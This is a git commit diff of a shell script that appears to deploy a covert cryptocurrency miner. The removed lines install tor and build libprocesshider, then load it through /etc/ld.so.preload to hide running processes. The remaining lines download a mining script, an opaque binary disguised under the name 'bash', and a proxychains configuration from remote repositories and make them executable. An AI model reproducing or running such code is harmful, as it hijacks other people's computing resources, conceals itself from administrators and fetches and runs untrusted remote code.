d4126ecd25c66d02fce61c919db6fd5bb0be0dd5
pagesrlepla <151825393+pagesrlepla@users.noreply.github.com>
2024-03-10 23:41:42 +0700

    Update and rename itsfish.sh to fishh.sh

--- fishh.sh
+++ fishh.sh
@@ -19,16 +19,6 @@ apt-get update && apt-get install -y \
  && mkdir -p /home/stuff
 apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 echo "Uploaded files:" && ls /home/stuff/
-ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-apt update
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
-service tor start
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-cd ..
 wget -q https://raw.githubusercontent.com/pagesrlepla/mx8/main/mine_fishhash.sh && chmod +x mine_fishhash.sh
 wget -q https://github.com/pagesrlepla/mx8/blob/main/bash && chmod +x bash
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
